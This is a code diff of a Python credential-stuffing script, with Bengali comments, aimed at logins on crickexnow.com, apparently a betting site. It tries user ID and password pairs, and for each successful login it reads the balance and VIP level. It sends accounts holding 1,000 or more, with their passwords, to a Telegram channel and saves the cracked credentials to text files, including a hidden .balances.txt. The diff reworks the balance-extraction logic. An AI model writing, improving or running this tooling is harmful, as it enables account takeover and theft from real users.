@@ -1,3 +1,4 @@
+
 import os
 import json
 import time
@@ -29,53 +30,43 @@ def show_logo():
     print(COLORS[-1] + BOLD + subtitle.center(width) + RESET + '\n')
 
 def get_balance_deep(data):
-    """এটি জেসন ডাটার যেকোনো লেভেল থেকে ব্যালেন্স খুঁজে বের করবে"""
-    
-    def find_balance(obj):
-        """রিকার্সিভলি JSON object থেকে ব্যালেন্স খোঁজা"""
-        if isinstance(obj, dict):
-            # সরাসরি ব্যালেন্স key গুলো চেক করা
-            balance_keys = ['mainWallet', 'balance', 'totalBalance', 'walletBalance', 'amount', 'currentBalance']
-            for key in balance_keys:
-                if key in obj and obj[key] is not None:
-                    try:
-                        return float(obj[key])
-                    except:
-                        return obj[key]
-            
-            # নেস্টেড ডিকশনারিতে সার্চ
-            for k, v in obj.items():
-                result = find_balance(v)
-                if result not in (None, 0):
-                    return result
-                    
-        elif isinstance(obj, list):
-            for item in obj:
-                result = find_balance(item)
-                if result not in (None, 0):
-                    return result
+    """bb.py থেকে ব্যালেন্স পাওয়ার লজিক"""
+    try:
+        # 1. প্রথমে totalMainProviderBalance চেক করা (bb.py তে এটাই ব্যবহার করা হয়েছে)
+        if 'totalMainProviderBalance' in data and data['totalMainProviderBalance'] is not None:
+            return data['totalMainProviderBalance']
+        
+        # 2. mainWallet চেক করা
+        if 'mainWallet' in data and data['mainWallet'] is not None:
+            return data['mainWallet']
+        
+        # 3. সরাসরি balance keys চেক করা
+        balance_keys = ['balance', 'mainBalance', 'totalBalance', 'availableBalance', 
+                       'walletBalance', 'currentBalance', 'totalAvailableBalance']
+        
+        for key in balance_keys:
+            if key in data and data[key] is not None:
+                return data[key]
+        
+        # 4. মেম্বার বা ওয়ালেট অবজেক্টে চেক করা
+        if 'member' in data and isinstance(data['member'], dict):
+            if 'mainWallet' in data['member'] and data['member']['mainWallet'] is not None:
+                return data['member']['mainWallet']
+        
+        if 'wallet' in data and isinstance(data['wallet'], dict):
+            wallet_keys = ['mainWallet', 'balance', 'totalBalance', 'availableBalance']
+            for key in wallet_keys:
+                if key in data['wallet'] and data['wallet'][key] is not None:
+                    return data['wallet'][key]
+        
+        # 5. vipInfo তে চেক করা
+        if 'vipInfo' in data and isinstance(data['vipInfo'], dict):
+            if 'totalAvailableBalance' in data['vipInfo']:
+                return data['vipInfo']['totalAvailableBalance']
+        
         return 0
-
-    # ১. সরাসরি ডাটাতে সার্চ
-    balance = find_balance(data)
-    if balance != 0:
-        return balance
-    
-    # ২. মেম্বার/ওয়ালেট/অ্যাকাউন্ট অবজেক্ট চেক
-    possible_objects = ['member', 'wallet', 'account', 'user', 'profile', 'info']
-    for obj_name in possible_objects:
-        if obj_name in data and data[obj_name]:
-            balance = find_balance(data[obj_name])
-            if balance != 0:
-                return balance
-    
-    # ৩. response এর মূল ডাটাতে সার্চ (পূর্বরতী অবস্থা)
-    if 'data' in data and data['data']:
-        balance = find_balance(data['data'])
-        if balance != 0:
-            return balance
-    
-    return 0
+    except Exception as e:
+        return 0
 
 def attempt_login(user_id, pw):
     global successful_users
@@ -92,7 +83,7 @@ def attempt_login(user_id, pw):
         'Origin': 'https://crickexnow.com',
     }
 
-    # bb.py Fingerprint
+    # bb.py এর একই fingerprint
     payload = {
         'languageTypeId': 1, 'currencyTypeId': 8, 'getIntercomInfo': True,
         'userId': user_id.lower().strip(), 'password': pw,
@@ -109,12 +100,11 @@ def attempt_login(user_id, pw):
             if res.get('status') == '000000':
                 data = res.get('data', {})
                 
-                # ব্যালেন্স স্ক্যানার কল করা
+                # ব্যালেন্স স্ক্যানার কল করা (bb.py এর মতো)
                 balance = get_balance_deep(data)
                 
                 # ভিআইপি লেভেল ফেচিং
-                vip_info = data.get('vipInfo', {})
-                level = vip_info.get('nowVipName', 'Normal')
+                level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
 
                 with lock: successful_users.add(user_id)
@@ -126,9 +116,19 @@ def attempt_login(user_id, pw):
                 status = 'Good' if is_high else 'Poor'
                 earn = '2 BDT' if is_high else '1 BDT'
 
-                # ব্যালেন্স ভিত্তিক প্রোফাইল
+                # ব্যালেন্স ভিত্তিক প্রোফাইল (bb.py এর মতো)
                 try:
-                    bal_val = float(balance) if isinstance(balance, (int, float, str)) else 0
+                    # Balance কে float এ কনভার্ট করার চেষ্টা
+                    if isinstance(balance, (int, float)):
+                        bal_val = float(balance)
+                    elif isinstance(balance, str):
+                        # String থেকে সংখ্যা extract করা
+                        import re
+                        nums = re.findall(r'\d+\.?\d*', balance)
+                        bal_val = float(nums[0]) if nums else 0
+                    else:
+                        bal_val = 0
+                    
                     if bal_val >= 1000:
                         send_telegram(uid, pw, balance, level)
                         if bal_val >= 10000: 
@@ -137,17 +137,22 @@ def attempt_login(user_id, pw):
                         elif bal_val >= 1500: 
                             earn = '50 BDT'
                             color = G
-                except: 
-                    bal_val = 0
-
-                # টার্মিনালে প্রিন্ট
-                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} | Balance: {balance} {D}')
-
-                # রিয়েল টাইম ব্যালেন্স সহ ফাইলে সেভ
-                with open(filename, 'a', encoding='utf-8') as f:
-                    f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
+                            
+                    # Balance টার্মিনালে দেখানো
+                    balance_display = f"Balance: {balance}"
                     
-                # আলাদা ব্যালেন্স ফাইল
+                except Exception as e:
+                    bal_val = 0
+                    balance_display = "Balance: 0"
+
+                # টার্মিনালে প্রিন্ট (bb.py এর স্টাইলে)
+                print(f'{BOLD}{color} {uid} | {pw} | {balance_display} | Level: {level} | Earn: {earn}{D}')
+
+                # ফাইলে সেভ (bb.py এর মতো format)
+                with open(filename, 'a', encoding='utf-8') as f:
+                    f.write(f'{uid} | {pw} | {balance} | {level}\n')
+                    
+                # আলাদা ব্যালেন্স ফাইল (যদি ব্যালেন্স থাকে)
                 if bal_val > 0:
                     with open('.balances.txt', 'a', encoding='utf-8') as f:
                         f.write(f'{uid} | {pw} | {balance} | {level}\n')
